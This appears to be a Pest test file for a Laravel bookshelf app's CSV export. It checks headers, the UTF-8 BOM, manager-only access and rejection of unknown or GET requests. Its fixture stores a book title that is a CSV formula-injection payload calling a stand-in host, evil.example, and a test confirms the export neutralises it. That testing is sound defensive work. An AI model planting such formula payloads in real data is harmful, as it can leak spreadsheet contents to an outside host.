<?php

use App\Models\Book;
use App\Models\BookCopy;
use App\Models\Bookshelf;
use App\Models\Membership;
use App\Models\User;
use App\Support\TenantContext;

/** Grep first: `grep -rn "^function xphFix" tests/`. */
function xphFix(): array
{
    app(TenantContext::class)->actSystemWide();

    $shelf = Bookshelf::factory()->create(['slug' => 'dong-thap-xph', 'name' => 'Tủ sách Đồng Tháp', 'settings' => []]);
    $manager = User::factory()->create(['full_name' => 'Maria Tải Tệp']);
    Membership::factory()->for($shelf)->create([
        'user_id' => $manager->id, 'role' => 'manager', 'status' => 'active',
    ]);
    $reader = User::factory()->create(['full_name' => 'Anna Không Tải Được']);
    Membership::factory()->for($shelf)->create([
        'user_id' => $reader->id, 'role' => 'reader', 'status' => 'active',
    ]);

    // A book whose title IS a formula, typed by a bored teenager with an
    // account: the end-to-end injection pin.
    $book = Book::query()->create([
        'bookshelf_id' => $shelf->id, 'slug' => 'sach-cong-thuc-xph',
        'title' => '=HYPERLINK("http://evil.example"&A2,"Bấm vào đây")',
    ]);
    BookCopy::query()->create(['bookshelf_id' => $shelf->id, 'book_id' => $book->id, 'code' => 'DT-0001', 'state' => 'available']);

    return compact('shelf', 'manager', 'reader');
}

it('streams a BOM-led UTF-8 CSV to a manager, uncacheable, named twice', function () {
    $f = xphFix();

    $response = $this->actingAs($f['manager'])
        ->post("/shelves/{$f['shelf']->slug}/manage/exports/books");

    $response->assertOk()
        ->assertHeader('Content-Type', 'text/csv; charset=utf-8')
        ->assertHeader('Cache-Control', 'no-store, private');

    $disposition = $response->headers->get('Content-Disposition');
    expect($disposition)->toContain('attachment')
        ->toContain('books-dong-thap-xph-')          // ascii fallback
        ->toContain("filename*=utf-8''");            // RFC 6266, Vietnamese label

    $bytes = $response->streamedContent();
    expect(substr($bytes, 0, 3))->toBe("\xEF\xBB\xBF")          // the BOM, as bytes
        ->and(explode("\r\n", substr($bytes, 3))[0])->toStartWith('Tên sách');
});

it('neutralises a hostile stored title end to end', function () {
    $f = xphFix();

    $bytes = $this->actingAs($f['manager'])
        ->post("/shelves/{$f['shelf']->slug}/manage/exports/books")
        ->streamedContent();

    expect($bytes)->toContain('\'=HYPERLINK')          // apostrophe-neutralised…
        ->and($bytes)->not->toContain("\n=HYPERLINK"); // …never cell-leading
});

it('404s a reader', function () {
    $f = xphFix();

    $this->actingAs($f['reader'])
        ->post("/shelves/{$f['shelf']->slug}/manage/exports/books")
        ->assertNotFound();
});

it('redirects a guest', function () {
    // Deviation from the brief's literal test (task-9-brief.md, Step 1):
    // the brief combines this assertion with the reader-404 one above in a
    // single it() block, `actingAs($reader)` FIRST and a bare `$this->
    // post(...)` second. Illuminate\Foundation\Testing\Concerns::actingAs()
    // sets the guard's authenticated user for the REST OF THE TEST METHOD,
    // not just the one call it decorates — Laravel does not log a test out
    // between two HTTP calls in the same it() block. So the brief's second
    // request is not a guest at all; it is still $reader, and the 404 it
    // was asserting to be a redirect passed for the wrong reason (or, as
    // found running this exact test, failed outright: "Expected response
    // status code [...redirect codes] but received 404" — reproduced by
    // running the brief's test verbatim before this split). Proven guest
    // by isolating it in its own it() block, per this brief's own stated
    // house rule elsewhere: "each actor in its own it() block" — the
    // combined block was the one place Task 9's own brief did not follow
    // it.
    $f = xphFix();

    $this->post("/shelves/{$f['shelf']->slug}/manage/exports/books")->assertRedirect();
});

it('404s a reader on readers and loans too — the group gate, not a books-only accident', function () {
    // Task 8's reviewer note this route exists to answer: three ungated
    // readers of a children's table fail open if you miss one. The
    // 'books' case above proves the gate fires for ONE kind; this proves
    // it fires independently for the other two — the gate is the
    // `manage` route group's ['auth', 'role:manager'] middleware
    // (routes/web.php), applied before {kind} is even inspected, so
    // nothing about a specific kind could make one of the three
    // forget to apply it — but "structurally cannot leak" is exactly the
    // kind of claim that must still be measured per kind, not assumed
    // from one green kind.
    $f = xphFix();

    foreach (['readers', 'loans'] as $kind) {
        $this->actingAs($f['reader'])
            ->post("/shelves/{$f['shelf']->slug}/manage/exports/{$kind}")
            ->assertNotFound();
    }
});

it('an unknown kind — constructor included — is a 404, never a 500', function () {
    $f = xphFix();

    foreach (['audit', 'constructor', 'sach', '1'] as $kind) {
        $this->actingAs($f['manager'])
            ->post("/shelves/{$f['shelf']->slug}/manage/exports/{$kind}")
            ->assertNotFound();
    }
});

it('GET is refused — a file of children\'s records is never a link', function () {
    $f = xphFix();

    $this->actingAs($f['manager'])
        ->get("/shelves/{$f['shelf']->slug}/manage/exports/readers")
        ->assertStatus(405);
});

it('readers and loans stream too, each with its own header row', function () {
    $f = xphFix();

    foreach (['readers' => 'Tên thánh', 'loans' => 'Tên sách'] as $kind => $firstHeader) {
        $bytes = $this->actingAs($f['manager'])
            ->post("/shelves/{$f['shelf']->slug}/manage/exports/{$kind}")
            ->streamedContent();
        expect(explode("\r\n", substr($bytes, 3))[0])->toStartWith($firstHeader);
    }
});
